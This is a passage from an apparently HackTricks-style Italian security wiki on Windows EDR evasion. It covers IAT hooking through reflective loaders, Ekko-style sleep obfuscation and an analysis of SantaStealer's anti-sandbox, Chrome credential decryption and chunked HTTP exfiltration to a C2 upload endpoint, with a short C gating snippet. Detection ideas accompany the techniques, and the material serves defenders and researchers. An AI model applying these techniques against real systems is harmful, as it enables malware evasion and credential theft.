- Stack anomalies: indirizzi di ritorno che non appartengono a immagini caricate; transizioni brusche verso PIC non‑image; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: scritture in‑process all'IAT, attività precoce in DllMain che modifica gli import thunks, regioni RX inaspettate create al load.
- Image‑load evasion: se si hooka LoadLibrary*, monitora caricamenti sospetti di automation/clr assemblies correlati con eventi di memory masking.

Building blocks correlati ed esempi
- Reflective loaders che eseguono IAT patching durante il load (per es., TitanLdr, AceLdr)
- Memory masking hooks (per es., simplehook) e stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (per es., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Se controlli un reflective loader, puoi hookare gli import durante `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver custom che controlla prima gli hook:

- Costruisci un **resident PICO** (persistent PIC object) che sopravvive dopo che il transient loader PIC si libera.
- Esporta una funzione `setup_hooks()` che sovrascrive il resolver di import del loader (es., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, salta gli ordinal imports e usa una lookup degli hook basata su hash come `__resolve_hook(ror13hash(name))`. Se esiste un hook, ritorna quello; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook a link time con le voci Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook rimane valido perché vive all'interno del resident PICO.

Questo produce una **import-time IAT redirection** senza patchare la sezione code della DLL caricata post-load.

### Forcing hookable imports when the target uses PEB-walking

Gli import a tempo di import vengono attivati solo se la funzione è effettivamente nella IAT del target. Se un modulo risolve le API via PEB-walk + hash (nessuna entry di import), forza un import reale così il percorso `ProcessImports()` del loader lo vede:

- Sostituisci la risoluzione di export hashata (es., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore emetterà una entry IAT, abilitando l'intercettazione quando il reflective loader risolve gli import.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Invece di patchare `Sleep`, hooka i primitivi di wait/IPC effettivi che l'implant usa (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per attese lunghe, avvolgi la chiamata in una catena di offuscamento in stile Ekko che cripta l'immagine in memoria durante l'idle:

- Usa `CreateTimerQueueTimer` per schedulare una sequenza di callback che chiamano `NtContinue` con `CONTEXT` frames costruiti ad arte.
- Catena tipica (x64): setta l'image a `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` sull'intera immagine mappata → esegui la wait bloccante → RC4 decrypt → **ripristina i permessi per-sezione** camminando le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un `CONTEXT` template; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni step.

Dettaglio operativo: ritorna “success” per attese lunghe (es., `WAIT_OBJECT_0`) così il chiamante continua mentre l'immagine è mascherata. Questo pattern nasconde il modulo dagli scanner durante le finestre di idle e evita la classica signature di `Sleep()` patchato.

Idee per detection (basate su telemetry)
- Raffiche di callback di `CreateTimerQueueTimer` che puntano a `NtContinue`.
- Uso di `advapi32!SystemFunction032` su buffer grandi e contigui di dimensione immagine.
- Ampi VirtualProtect seguiti da ripristino dei permessi per-sezione personalizzato.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustra come gli info‑stealer moderni fondono AV bypass, anti-analysis e accesso a credential in un unico workflow.

### Keyboard layout gating & sandbox delay

- Un flag di config (`anti_cis`) enumera le keyboard layout installate tramite `GetKeyboardLayoutList`. Se viene trovata una layout cirillica, il sample deposita un marcatore vuoto `CIS` e termina prima di lanciare gli stealers, assicurandosi di non detonare su locale escluse pur lasciando un hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica a strati `check_antivm`

- Variant A scorre la lista dei processi, effettua l'hash di ogni nome con un checksum rolling custom e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- Variant B ispeziona proprietà di sistema (soglia del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox e esegue controlli temporali attorno a sleep per individuare single-stepping. Qualunque corrispondenza abortisce prima che i moduli vengano lanciati.

### Fileless helper + double ChaCha20 reflective loading

- Il DLL/EXE primario incorpora un Chromium credential helper che viene o droppato su disco o mappato manualmente in memoria; la modalità fileless risolve import/relocation da sola in modo che non vengano scritti artefatti del helper.
- Quel helper contiene una DLL di secondo stadio criptata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambe le passate carica riflessivamente il blob (no `LoadLibrary`) e chiama le export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivate da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Le routine di ChromElevator usano direct-syscall reflective process hollowing per injectare in un Chromium browser live, ereditare le AppBound Encryption keys e decriptare password/cookie/carte di credito direttamente dai database SQLite nonostante l'hardening ABE.

### Raccolta modulare in-memory & chunked HTTP exfil

- `create_memory_based_log` itera una tabella globale di puntatori a funzione `memory_generators` e crea un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshots, documents, browser extensions, ecc.). Ogni thread scrive i risultati in buffer condivisi e segnala il conteggio dei file dopo una finestra di join di ~45s.
- Una volta terminato, tutto viene zippato con la libreria staticamente linkata `miniz` come `%TEMP%\\Log.zip`. `ThreadPayload1` poi dorme 15s e streamma l'archivio in chunk da 10 MB via HTTP POST a `http://<C2>:6767/upload`, spoofando il boundary `multipart/form-data` di un browser (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, opzionale `w: <campaign_tag>`, e l'ultimo chunk appende `complete: true` così il C2 sa che la reassemblazione è completata.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
